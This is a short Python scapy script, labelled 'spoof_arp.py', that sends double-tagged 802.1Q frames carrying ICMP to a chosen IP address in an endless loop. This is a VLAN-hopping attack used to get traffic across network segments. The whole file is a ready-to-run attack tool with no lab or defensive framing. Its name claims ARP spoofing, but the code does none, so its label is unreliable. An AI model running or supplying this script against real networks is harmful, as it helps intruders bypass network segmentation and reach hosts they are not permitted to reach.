from scapy.all import *
import sys

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 spoof_arp.py <VLAN ID 1> <VLAN ID 2> <Destination IP>")
        sys.exit(1)

    # Get the VLAN IDs and destination IP from command line arguments
    vlan_id1 = int(sys.argv[1])
    vlan_id2 = int(sys.argv[2])
    dest_ip = sys.argv[3]
    
    packet = (
        Ether(dst="ff:ff:ff:ff:ff:ff") /
        Dot1Q(vlan=vlan_id1) /
        Dot1Q(vlan=vlan_id2) /
        IP(dst=dest_ip) /
        ICMP()
    )

    while True:
        sendp(packet, iface="eth0", verbose=1)
        time.sleep(2)
    

if __name__ == "__main__":
    main()
